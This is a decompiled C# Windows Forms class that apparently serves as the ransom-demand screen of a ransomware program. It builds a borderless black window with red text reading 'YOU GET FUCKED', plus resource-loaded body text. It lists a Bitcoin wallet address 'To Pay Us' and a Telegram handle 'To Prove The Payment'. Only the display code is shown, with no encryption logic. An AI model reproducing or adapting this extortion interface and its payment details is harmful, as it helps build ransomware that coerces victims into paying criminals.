using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace GetFucked;

public class Form2 : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private Label label4;

	private Label label3;

	private Label label5;

	private Label label6;

	private Label label8;

	private Label label7;

	public Form2()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0158: Expected O, but got Unknown
		//IL_01f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fc: Expected O, but got Unknown
		//IL_0299: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a3: Expected O, but got Unknown
		//IL_0340: Unknown result type (might be due to invalid IL or missing references)
		//IL_034a: Expected O, but got Unknown
		//IL_03ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f7: Expected O, but got Unknown
		//IL_0484: Unknown result type (might be due to invalid IL or missing references)
		//IL_048e: Expected O, but got Unknown
		//IL_051f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0529: Expected O, but got Unknown
		//IL_066e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0678: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		label1 = new Label();
		label2 = new Label();
		label4 = new Label();
		label3 = new Label();
		label5 = new Label();
		label6 = new Label();
		label8 = new Label();
		label7 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Black);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)254));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(12, 123));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(682, 170));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text(componentResourceManager.GetString("label1.Text"));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Black);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 15f, (FontStyle)1, (GraphicsUnit)3, (byte)254));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(10, 98));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(935, 25));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("=======================================================================");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.Black);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 30f, (FontStyle)1, (GraphicsUnit)3, (byte)254));
		((Control)label4).set_ForeColor(Color.Red);
		((Control)label4).set_Location(new Point(279, 30));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(388, 46));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("YOU GET FUCKED");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(Color.Black);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 15f, (FontStyle)1, (GraphicsUnit)3, (byte)254));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(10, 293));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(935, 25));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("=======================================================================");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_BackColor(Color.Black);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)254));
		((Control)label5).set_ForeColor(Color.Red);
		((Control)label5).set_Location(new Point(12, 318));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(578, 85));
		((Control)label5).set_TabIndex(5);
		((Control)label5).set_Text(componentResourceManager.GetString("label5.Text"));
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_BackColor(Color.Black);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 15f, (FontStyle)1, (GraphicsUnit)3, (byte)254));
		((Control)label6).set_ForeColor(Color.Red);
		((Control)label6).set_Location(new Point(10, 403));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(935, 25));
		((Control)label6).set_TabIndex(6);
		((Control)label6).set_Text("=======================================================================");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 11f, (FontStyle)1, (GraphicsUnit)3, (byte)254));
		((Control)label8).set_ForeColor(Color.Red);
		((Control)label8).set_Location(new Point(160, 470));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(629, 18));
		((Control)label8).set_TabIndex(21);
		((Control)label8).set_Text("Our Telegram App User:  TELEGRAM : @getfucked2020 ( To Prove The Payment )");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 11f, (FontStyle)1, (GraphicsUnit)3, (byte)254));
		((Control)label7).set_ForeColor(Color.Red);
		((Control)label7).set_Location(new Point(177, 443));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(586, 18));
		((Control)label7).set_TabIndex(20);
		((Control)label7).set_Text("Our Bitcoin Wallet: 3NqdQ89Y7QXpsvjy5o2tYgHnFBAUvD3dK4 ( To Pay Us )");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(957, 516));
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form2");
		((Control)this).set_Text("Form2");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
